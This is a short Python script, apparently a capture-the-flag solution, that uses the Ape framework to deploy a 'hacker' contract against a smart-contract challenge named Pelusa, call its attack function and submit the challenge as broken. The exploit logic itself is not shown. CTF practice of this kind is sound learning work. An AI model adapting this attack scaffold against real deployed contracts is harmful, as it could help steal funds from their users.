from ape import accounts, project
from .utils.helper import (
    get_challenge_instance,
    challenge_broken,
    prep_blueprint_deployment,
)

CHALLENGE_MANAGER = "0x157EB6396D44F63D3970a72C253BfB5ACEEc80dD"
CHALLENGE_FACTORY = "0xAA758e00ecA745Cab9232b207874999F55481951"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get challenge instance
    instance, eko = get_challenge_instance(
        CHALLENGE_MANAGER,
        CHALLENGE_FACTORY,
        user,
    )

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    blueprint_address, deployment_code = prep_blueprint_deployment("Pelusa")
    accomplice = project.PelusaHelper.deploy(
        blueprint_address,
        instance,
        deployment_code,
        sender=user,
    )

    # exploit goes here
    print("\n--- Exploiting challenge instance ---\n")
    hacker = project.Pelusa.at(accomplice.hacker())
    hacker.attack(CHALLENGE_FACTORY, sender=user)

    # submiting challenge instance
    print("\n--- Breaking challenge instance ---\n")
    submit_tx = eko.breakChallenge(CHALLENGE_FACTORY, sender=user)

    # checking if challenge is completed
    challenge_broken(eko, submit_tx, user.address, CHALLENGE_FACTORY)

    print("\n--- 🥂!CHALLENGE COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
